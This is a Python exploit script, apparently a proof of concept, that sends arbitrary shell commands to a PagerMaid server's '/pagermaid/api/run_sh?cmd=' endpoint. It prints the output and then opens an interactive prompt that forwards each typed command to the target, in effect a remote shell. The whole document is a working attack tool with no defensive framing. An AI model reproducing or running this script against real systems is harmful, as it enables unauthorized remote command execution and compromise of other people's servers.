import requests
import argparse

requests.packages.urllib3.disable_warnings()


def main():
    banner = """
       _________    _____   ____  _______  __ ___________ 
      / ___\__  \  /     \_/ __ \/  _ \  \/ // __ \_  __ \
     / /_/  > __ \|  Y Y  \  ___(  <_> )   /\  ___/|  | \/
     \___  (____  /__|_|  /\___  >____/ \_/  \___  >__|   
    /_____/     \/      \/     \/                \/                                                                         

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-c','--cmd',dest='cmd',help='执行的命令',default='whoami')
    args = parse.parse_args()
    if 'http' in args.url:
        target = args.url
    else:
        target =f"http://{args.url}"
    print(f"[]目标url{target}")
    print(f"[]命令{args.cmd}")
    check(target,args.cmd)
    ml(target)
def check(target,cmd=None):
    url = f"{target}/pagermaid/api/run_sh?cmd={cmd}"
    headers = {
        'Accept-Encoding':'gzip, deflate',
        'Accept':'application/json, text/plain, */*',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
    }
    response = requests.get(url=url, headers=headers, verify=False)
    try:
        print(response.text.strip())
        if response.status_code == 200:
            print(f"命令执行成功{cmd}")
            print(f"\n{response.text.strip()}")
        else:
            print("失败")
    except Exception as e:
        pass
def ml(target):
    while True:
        cmd = input(">>")
        check(target,cmd)
        if cmd.lower() == "exit":
            break
        if not cmd:
            continue
        check(target,cmd)
if __name__ == '__main__':
    main()